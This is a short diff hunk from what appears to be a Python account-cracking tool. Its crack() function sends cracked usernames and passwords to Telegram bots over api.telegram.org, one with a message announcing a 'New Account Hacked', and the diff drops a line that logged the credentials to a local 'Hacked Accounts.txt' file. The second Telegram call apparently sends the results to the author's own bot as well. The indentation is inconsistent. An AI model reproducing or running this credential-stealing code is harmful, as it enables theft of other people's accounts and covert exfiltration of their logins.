@@ -176,8 +176,7 @@ def crack():
 			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=' + sender
 			response = requests.get(send_telegram)
 			send_my =     t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=𝐇𝐞𝐥𝐥𝐨 FARDIN 𝐍𝐞𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐇𝐚𝐜𝐤𝐞𝐝 ✅✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\n\n[=] Uѕᴇʀɴᴀᴍᴇ : {user} \n[=] Pᴀѕѕᴡᴏʀᴅ : {pasw}\n✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠\nBy @i4m_REX")
-            open("Hacked Accounts.txt","a").write(f"{user}:{pasw}\n")
-			r2+=1
+                        r2+=1
 			os.system('clear')
 			
 			print(logo)
